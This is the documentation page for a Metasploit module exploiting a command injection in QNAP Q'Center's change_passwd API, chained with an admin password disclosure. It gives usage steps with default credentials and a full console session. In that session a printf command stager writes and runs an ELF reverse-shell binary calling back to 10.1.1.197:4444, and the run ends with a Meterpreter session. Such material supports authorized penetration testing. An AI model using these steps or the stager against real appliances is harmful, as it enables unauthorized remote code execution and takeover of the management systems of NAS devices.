## Description

  This module exploits a command injection vulnerability in the
  `change_passwd` API method within the web interface of QNAP Q'Center
  virtual appliance versions prior to 1.7.1083.

  The vulnerability allows the `admin` privileged user account to
  execute arbitrary commands as the `admin` operating system user.

  Valid credentials for the `admin` user account are required, however,
  this module also exploits a separate password disclosure issue which
  allows any authenticated user to view the password set for the `admin`
  user during first install.


## Vulnerable Application
 
  [QNAP Q'Center](https://www.qnap.com/solution/qcenter/index.php) is a central
  management platform that enables you to consolidate the management of multiple
  QNAP NAS devices.

  This module has been tested successfully on QNAP Q'Center appliance
  version 1.6.1075.


## Verification Steps

  1. Start `msfconsole`
  2. `use exploit/linux/http/qnap_qcenter_change_passwd_exec`
  3. `set RHOSTS <IP>`
  4. `set USERNAME <USERNAME>` (default: `admin`)
  5. `set PASSWORD <PASSWORD>` (default: `admin`)
  6. `run`
  7. You should get a session


## Options

  **USERNAME**

  Username for the application. (default: `admin`)

  **PASSWORD**

  Password for the application. (default: `admin`)


## Scenarios

  ```
  msf5 > use exploit/linux/http/qnap_qcenter_change_passwd_exec 
  msf5 exploit(linux/http/qnap_qcenter_change_passwd_exec) > set rhosts 10.1.1.112
  rhosts => 10.1.1.112
  msf5 exploit(linux/http/qnap_qcenter_change_passwd_exec) > set verbose true
  verbose => true
  msf5 exploit(linux/http/qnap_qcenter_change_passwd_exec) > check
  
  [*] Target is QNAP Q'Center appliance version 1.6.1075
  [*] 10.1.1.112:443 The target appears to be vulnerable.
  msf5 exploit(linux/http/qnap_qcenter_change_passwd_exec) > run
  
  [*] Started reverse TCP handler on 10.1.1.197:4444 
  [*] Target is QNAP Q'Center appliance version 1.6.1075
  [+] Authenticated as user 'admin' successfully
  [*] Sending payload ...
  [*] Generated command stager: ["printf '\\177\\105\\114\\106\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\2\\0\\3\\0\\1\\0\\0\\0\\124\\200\\4\\10\\64\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\64\\0\\40\\0\\1\\0\\0\\0\\0\\0\\0\\0\\1\\0\\0\\0\\0\\0\\0\\0\\0\\200\\4\\10\\0\\200\\4\\10\\317\\0\\0\\0\\112\\1\\0\\0\\7\\0\\0\\0\\0\\20\\0\\0\\152\\12\\136\\61\\333\\367\\343\\123\\103\\123\\152\\2\\260\\146\\211\\341\\315\\200\\227\\133\\150\\12\\1\\1\\305\\150\\2\\0\\21\\134\\211\\341\\152\\146\\130\\120\\121\\127\\211\\341\\103\\315\\200\\205\\300\\171\\31\\116\\164\\75\\150\\242\\0\\0\\0\\130\\152\\0\\152\\5\\211\\343\\61\\311\\315\\200\\205\\300\\171\\275\\353\\47\\262\\7\\271\\0\\20\\0\\0\\211\\343\\301\\353\\14\\301\\343\\14\\260\\175\\315\\200\\205\\300\\170\\20\\133\\211\\341\\231\\266\\14\\260\\3\\315\\200\\205\\300\\170\\2\\377\\341\\270\\1\\0\\0\\0\\273\\1\\0\\0\\0\\315\\200'>>/tmp/ivFxR ; chmod +x /tmp/ivFxR ; /tmp/ivFxR ; rm -f /tmp/ivFxR"]
  [*] Transmitting intermediate stager...(106 bytes)
  [*] Sending stage (861480 bytes) to 10.1.1.112
  [*] Command Stager progress - 100.00% done (701/701 bytes)
  
  meterpreter > getuid
  Server username: uid=1001, gid=1001, euid=1001, egid=1001
  meterpreter > sysinfo
  Computer     : 10.1.1.112
  OS           : Ubuntu 14.04 (Linux 3.13.0-32-generic)
  Architecture : x64
  BuildTuple   : i486-linux-musl
  Meterpreter  : x86/linux
  meterpreter > 
  ```

